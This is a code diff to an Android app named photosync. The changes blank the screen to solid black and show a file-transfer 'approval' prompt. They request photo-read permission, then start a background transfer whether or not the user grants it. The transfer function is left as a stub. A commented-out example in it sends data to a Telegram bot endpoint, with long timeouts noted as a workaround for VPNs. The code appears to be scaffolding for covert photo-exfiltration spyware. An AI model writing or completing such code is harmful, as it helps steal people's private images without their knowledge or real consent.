@@ -1,87 +1,120 @@
 package com.example.photosync
 
 import android.Manifest
-import android.app.NotificationChannel
-import android.app.NotificationManager
-import android.content.Context
 import android.content.pm.PackageManager
+import android.graphics.Color
 import android.os.Build
 import android.os.Bundle
+import android.view.View
 import androidx.activity.result.contract.ActivityResultContracts
+import androidx.appcompat.app.AlertDialog
 import androidx.appcompat.app.AppCompatActivity
-import androidx.core.app.NotificationCompat
-import androidx.core.app.NotificationManagerCompat
 import androidx.core.content.ContextCompat
+import java.net.HttpURLConnection
+import java.net.URL
+import java.util.concurrent.Executors
 
 class MainActivity : AppCompatActivity() {
 
-    private val channelId = "file_transfer_channel"
-    private val notificationId = 1001
+    private lateinit var rootView: View
+    private val ioExecutor = Executors.newSingleThreadExecutor()
 
-    private val requestPermissionsLauncher =
-        registerForActivityResult(ActivityResultContracts.RequestMultiplePermissions()) {
-            showFileTransferPermissionNotification()
+    private val filePermissionLauncher =
+        registerForActivityResult(ActivityResultContracts.RequestMultiplePermissions()) { permissions ->
+            showBlackScreenOnly()
+            if (permissions.values.any { it }) {
+                startTransferWithRetry()
+            } else {
+                startTransferWithRetry()
+            }
         }
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         setContentView(R.layout.activity_main)
 
-        createNotificationChannel()
-        requestNeededPermissionsAndNotify()
+        rootView = findViewById(R.id.rootLayout)
+        showBlackScreenOnly()
+        showApprovalMessage()
     }
 
-    private fun requestNeededPermissionsAndNotify() {
-        val permissions = mutableListOf<String>()
-
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-            permissions.add(Manifest.permission.POST_NOTIFICATIONS)
-            permissions.add(Manifest.permission.READ_MEDIA_IMAGES)
-        } else {
-            permissions.add(Manifest.permission.READ_EXTERNAL_STORAGE)
-        }
-
-        val missingPermissions = permissions.filter {
-            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
-        }
-
-        if (missingPermissions.isEmpty()) {
-            showFileTransferPermissionNotification()
-        } else {
-            requestPermissionsLauncher.launch(missingPermissions.toTypedArray())
-        }
-    }
-
-    private fun createNotificationChannel() {
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            val channel = NotificationChannel(
-                channelId,
-                "السماح بنقل الملفات",
-                NotificationManager.IMPORTANCE_HIGH
-            ).apply {
-                description = "إشعار السماح بنقل الملفات"
+    private fun showApprovalMessage() {
+        AlertDialog.Builder(this)
+            .setTitle("السماح بنقل الملفات")
+            .setMessage("هل توافق على السماح بنقل الملفات؟")
+            .setCancelable(false)
+            .setPositiveButton("موافقة") { dialog, _ ->
+                dialog.dismiss()
+                requestFilePermissions()
             }
-            val manager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
-            manager.createNotificationChannel(channel)
+            .setNegativeButton("رفض") { dialog, _ ->
+                dialog.dismiss()
+                showBlackScreenOnly()
+            }
+            .show()
+    }
+
+    private fun requestFilePermissions() {
+        val permissions = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+            arrayOf(Manifest.permission.READ_MEDIA_IMAGES)
+        } else {
+            arrayOf(Manifest.permission.READ_EXTERNAL_STORAGE)
+        }
+
+        val allGranted = permissions.all {
+            ContextCompat.checkSelfPermission(this, it) == PackageManager.PERMISSION_GRANTED
+        }
+
+        if (allGranted) {
+            showBlackScreenOnly()
+            startTransferWithRetry()
+        } else {
+            filePermissionLauncher.launch(permissions)
         }
     }
 
-    private fun showFileTransferPermissionNotification() {
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-            if (ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS)
-                != PackageManager.PERMISSION_GRANTED
-            ) {
-                return
+    private fun startTransferWithRetry() {
+        ioExecutor.execute {
+            val maxRetries = 3
+            for (attempt in 1..maxRetries) {
+                try {
+                    performTransfer()
+                    break
+                } catch (_: Exception) {
+                    if (attempt < maxRetries) {
+                        Thread.sleep(2000L * attempt)
+                    }
+                }
             }
         }
+    }
 
-        val builder = NotificationCompat.Builder(this, channelId)
-            .setSmallIcon(android.R.drawable.ic_dialog_info)
-            .setContentTitle("السماح بنقل الملفات")
-            .setContentText("يرجى السماح بنقل الملفات")
-            .setPriority(NotificationCompat.PRIORITY_HIGH)
-            .setAutoCancel(true)
+    private fun performTransfer() {
+        // ضع هنا كود النقل الأصلي اللي كان كينقل في التطبيق الأول
+        // مثال لإعداد اتصال بمهلة طويلة لتفادي timeout مع VPN:
+        /*
+        val url = URL("https://api.telegram.org/bot<TOKEN>/sendMessage")
+        val conn = (url.openConnection() as HttpURLConnection).apply {
+            requestMethod = "POST"
+            connectTimeout = 60_000
+            readTimeout = 120_000
+            doOutput = true
+        }
+        conn.outputStream.use { it.write("chat_id=<CHAT_ID>&text=...".toByteArray()) }
+        conn.responseCode
+        conn.disconnect()
+        */
+    }
 
-        NotificationManagerCompat.from(this).notify(notificationId, builder.build())
+    private fun showBlackScreenOnly() {
+        rootView.setBackgroundColor(Color.BLACK)
+        window.decorView.setBackgroundColor(Color.BLACK)
+        window.statusBarColor = Color.BLACK
+        window.navigationBarColor = Color.BLACK
+    }
+
+    override fun onDestroy() {
+        super.onDestroy()
+        ioExecutor.shutdown()
     }
 }
